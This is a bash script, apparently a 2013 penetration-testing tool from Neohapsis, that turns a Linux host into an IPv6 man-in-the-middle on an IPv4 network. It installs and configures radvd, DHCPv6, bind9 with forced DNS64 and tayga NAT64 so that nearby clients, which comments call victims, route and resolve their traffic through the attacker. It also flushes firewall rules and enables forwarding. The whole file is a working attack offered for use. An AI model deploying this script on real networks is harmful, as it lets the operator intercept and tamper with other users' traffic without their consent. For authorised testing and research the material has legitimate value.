#!/bin/bash
PATH="/usr/bin:/usr/sbin:/bin:/sbin"
#
# Unpublished Proprietary Source Code
# Copyright (C) 2013 Neohapsis, Inc.
# All rights reserved
#
# Unlicensed copying, use, publication, or redistribution is prohibited.
#
# No warranty, express or implied, is attached to this software,
# There is NO WARRANTY OF MERCHANTABILITY or FITNESS FOR A
# PARTICULAR PURPOSE.  You have been warned.
#
# surpriseSix.sh
###
# IPv6 MITM Setup Script
# 20130712 Fix for radvd service on Kali
# 20130321 First version for neo - bb < brent DOT bandelgar AT neohapsis DOT com >
# This script will install dependencies and configure the system for IPv6 infrastructure
# Written for plain Ubuntu 12.04 LTS, might work on Debian 6 or Kali with minor adjustments
# Run me as root!

#GLOBALS
#TAYGAINTERFACE default name for the Tayga virtual interface
TAYGAINTERFACE="nat64"
#DEFAULT6PREFIX default IPv6 prefix to present, we're assuming the reserved 64:FF9B::/96
#If you use this as a variable you must end it appropriately by adding the necessary colons or full expansion (i.e. 64:FF9B::1) 
DEFAULT6PREFIX="2001:db8:1:"
DEFAULT6CIDR="96"
#DEFAULT64MAPPREFIX default IPv6 prefix to map the IPv4 responses into, it must be in the defined prefix. This will be added as a route to the tayga interface.
TAYGA64MAPPREFIX="${DEFAULT6PREFIX}FFFF::/96"
#DIP6 IPv6 address and CIDR to assign to DINTERFACE
#THIS WILL ALSO BE USED/ADVERTISED AS THE DNS6 SERVER ADDRESS
DIP6="${DEFAULT6PREFIX}:2" #i.e. 64:FF9B::2
#Advertised SLAAC routing will also use this cidr
DIP6CIDR="64"
#i.e. ${DIP6}/${DIP6CIDR} = 64:FF9B::2/64
#DHCPv6 range
DHCPV6START="${DEFAULT6PREFIX}CAFE::10" #i.e. 64:FF9B::CAFE:10
DHCPV6END="${DEFAULT6PREFIX}CAFE::0240" #i.e. 64:FF9B::CAFE:0240
DHCPV6DOMAIN="localdomain6"
#TAYGA6IP IPv6 address to be assigned to the tayga virtual interface for the 6-side of NATting
TAYGA6IP="${DEFAULT6PREFIX}:3" #i.e. 64:FF9B::3

#TAYGA4SUBNET default IPv4 /24 subnet for tayga to NAT traffic through. This will only be used on the nat64 interface but should NOT be a network that is in use.
TAYGA4SUBNET="192.168.255.0/24"
#TAYGA4IP default IPv4 address for tayga virtual interface, it should be within TAYGA4SUBNET
TAYGA4IP="192.168.255.1"
#DINTERFACE interface to listen on, defaulted here but we'll prompt for it
DINTERFACE="eth0"
#DSECONDIP second "Legitimate" IPv4 address to prompt for, assuming an actual DHCPv4 lease is the first. This will be assigned to the tayga nat64 interface for NAT-ing
DSECONDIP=""
#NAMESERVERS existing IPv4 DNS servers, this should be replaced with the internal DNSv4 servers from DHCP
#If we get a blank we'll fall back to google
#BINDFORWARDERS="8.8.8.8;"
DEFAULTNAMESERVERS="8.8.8.8"

##CONFIG FILE LOCATIONS
#wide-dhcpv6-server
PATHDEFDHCP6CONF="/etc/default/wide-dhcpv6-server"
PATHDHCP6CONF="/etc/wide-dhcpv6/dhcp6s.conf"
#tayga
PATHTAYGACONF="/etc/tayga.conf"
#radvd
PATHRADVDCONF="/etc/radvd.conf"
#bind9 options
PATHNAMEDOPTIONSCONF="/etc/bind/named.conf.options"

#INSTALLEDLIST list of installed Debian packages
INSTALLEDLIST=""

#FUNCTIONS
#Sets up the system for IPv6
function loadIPv6Module {
    /sbin/modprobe ipv6
    # persist this with
    #echo 'ipv6' >> /etc/modules
}
#Sets up the system for forwarding
function enableForwarding {
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
    #persist these in /etc/sysctl.conf
}

#Remove all the iptables rules
function clearIpTables {  
    /sbin/iptables -F
    /sbin/iptables -X
    /sbin/ip6tables -F
    /sbin/ip6tables -X
}
#Set up the 6-4 forwarding between your interface and the tayga virtual interface
function setIpTablesForwarding {
    # Set up iptables nat64
    /sbin/iptables -I FORWARD -j ACCEPT -i $TAYGAINTERFACE -o $DINTERFACE
    /sbin/iptables -I FORWARD -j ACCEPT -i $DINTERFACE -o $TAYGAINTERFACE -m state --state RELATED,ESTABLISHED
    /sbin/iptables -t nat -I POSTROUTING -o $DINTERFACE -j MASQUERADE
    #this never worked /sbin/iptables -I FORWARD  -j LOG --log-prefix "IPTables forward: "
    #Drop destination unreachable messages for when we have leaks of legit ipv6 addresses, i.e. from the legit dhcpv4 server
    /sbin/ip6tables -A OUTPUT -p icmpv6 --icmpv6-type 1 -j DROP
}
#Config file creation functions
#use the EOF sentinal style for long config file
# do NOT quote EOF ("EOF"), let bash expand variables here

#Creates /etc/default/wide-dhcpv6-server and /etc/wide-dhcpv6/dhcp6s.conf
function setWideDhcp6Conf {
    #Make active dhcpv6 on your interface (Debian)
    echo "INTERFACES=${DINTERFACE}" > $PATHDEFDHCP6CONF
    echo "Writing to $PATHDEFDHCP6CONF"
    #Now the actual config
read -d '' DHCP6CONF << EOF
option domain-name-servers ${DIP6};
option domain-name "${DHCPV6DOMAIN}";
interface ${DINTERFACE} {
	address-pool pool1 3600;
};
pool pool1 {
	range ${DHCPV6START} to ${DHCPV6END};
};
EOF
    echo "${DHCP6CONF}" > ${PATHDHCP6CONF}
    echo "Writing to $PATHDHCP6CONF"
}
#Creates /etc/tayga.conf
function setTaygaConf {
read -d '' TAYGACONF << EOF
tun-device ${TAYGAINTERFACE}
ipv4-addr ${TAYGA4IP}
prefix  ${TAYGA64MAPPREFIX}
dynamic-pool ${TAYGA4SUBNET}
EOF
    echo "${TAYGACONF}" > $PATHTAYGACONF
    echo "Writing to $PATHTAYGACONF"
}
#Creates /etc/radvd.conf
function setRADvdConf {
#use the EOF sentinal style for long config file
read -d '' RADVDCONF << EOF
interface ${DINTERFACE}
{
	AdvSendAdvert on;
	MinRtrAdvInterval 3;
	MaxRtrAdvInterval 10;
	AdvHomeAgentFlag off;
	#Clients should query our DHCPv6 server for other stuff (i.e. DNS) needed for Win7/Win8
	AdvOtherConfigFlag on;
	#desired slaac 
	prefix ${DEFAULT6PREFIX}:/${DIP6CIDR}
	{
		AdvOnLink on;
		AdvAutonomous on;
		AdvRouterAddr off;
	};
	#Advertise our IPv6 address as DNS server. This is ignored by Win7+
	RDNSS ${DIP6}
	{
		AdvRDNSSLifetime 30;
	};
};
EOF

    echo "${RADVDCONF}" > $PATHRADVDCONF
    echo "Writing to $PATHRADVDCONF"
}
#Creates /etc/bind/named.conf.options
function setBind9Options {
    #populate BINDFORWARDERS
    getNameServers
read -d '' NAMEDCONF << EOF
options {
	directory "/var/cache/bind";
	forwarders {
		#The actual client DNS servers here, don't use the root fallback
		#GRAB THESE FROM /etc/resolv.conf from dhcp?
		${BINDFORWARDERS}
	};
	dnssec-validation auto;
	auth-nxdomain no;
	listen-on-v6 { any; };
	allow-query { any; };
	#bind9 standard - compatible mapping
	dns64 ${TAYGA64MAPPREFIX} {
		#todo lock this down to just our victim ipv6 prefixes
		clients { any; };
		#Disregard all legit AAAA responses, always return our prefixed A responses for AAAA
		exclude { any; };
	};
};
EOF
    echo "${NAMEDCONF}" > ${PATHNAMEDOPTIONSCONF}
    echo "Writing to ${PATHNAMEDOPTIONSCONF}"
}
#extracts nameservers from /etc/resolv.conf
function getNameServers {
    if [ -e "/etc/resolv.conf" ]; then
        local NAMESERVERS=`/bin/grep '^nameserver' /etc/resolv.conf | /usr/bin/awk '{print $2}'`
        if [ -z "$NAMESERVERS" ] ; then
            NAMESERVERS="$DEFAULTNAMESERVERS"
        fi
        #suffix the values with a semicolon for named.conf
        for server in $NAMESERVERS; do
            BINDFORWARDERS+="${server};"
            BINDFORWARDERS+=$'\n'
        done
    fi
}
#Get list of installed packages for checking
function getInstalledDpkg {
    INSTALLEDLIST=`/usr/bin/dpkg --get-selections | grep install | awk '{print $1}'`
}
#Find out if a package is installed, takes a string argument for package name
#Returns true or false (commands /bin/true /bin/false)
function isPkgInstalled {
    search_str="$1"
    case "$INSTALLEDLIST" in 
       *"$search_str"* ) true;;
       * ) echo false;;
    esac
}
#Install packages, these should all be in the standard Ubuntu repos
function installPrereqDpkgs {
    /usr/bin/apt-get install -y sipcalc tayga radvd wide-dhcpv6-server bind9
}
#Set up Taya interface, IP addresses and routes, and and start Tayga
function startTayga {
    # Set up interfaces
    ip addr add "${DIP6}/${DIP6CIDR}" dev $DINTERFACE
    #makes nat64 interface according to tayga.conf
    /usr/sbin/tayga --mktun
    ip link set $TAYGAINTERFACE up
    
    ip addr add $DSECONDIP dev $TAYGAINTERFACE
    ip addr add $TAYGA4IP dev $TAYGAINTERFACE
    ip route add $TAYGA4SUBNET dev $TAYGAINTERFACE

    ip addr add $TAYGA6IP dev $TAYGAINTERFACE
    ip route add $TAYGA64MAPPREFIX dev $TAYGAINTERFACE
    #Now run tayga as a daemon
    /usr/sbin/tayga && ( echo "tayga should now be running as a daemon"; return 0 )
}
function stopTayga {
    ip link set $TAYGAINTERFACE down
    /usr/sbin/tayga --rmtun
}

#EXECUTION

/bin/ping6 -c 3 google.com && ( echo "I am able to IPv6 ping google.com already, bailing out."; exit )


#Kind of mindless for now just install the packages we need first
echo "Welcome, I'll install a few packages and ask a couple of questions first"
installPrereqDpkgs
# Prompt for network interface to use
read -p "Please enter the interface name to listen on (default ${DINTERFACE}): " DINTERFACE
echo "This is your current address information: "
sipcalc $DINTERFACE
# Prompt for second IP on the subnet
read -p "Please enter an additional available IPv4 address in this range: " DSECONDIP
#Configure these system parameters in a non-persistent way for now
loadIPv6Module
enableForwarding

clearIpTables
stopTayga

setBind9Options
setRADvdConf
setWideDhcp6Conf
setTaygaConf
#Most of the non-persistent configuration is in startTayga
if startTayga; then
    sleep 5
    #Restart our daemons they need to know our addresses
    #TODO: check if we need to enable them
    service radvd stop
    sleep 3
    service radvd start
    service bind9 restart
    service wide-dhcpv6-server restart
    #More non-persistent configuration
    setIpTablesForwarding

    echo "I'm ready."
else
    echo "Failed to start NAT64"
fi
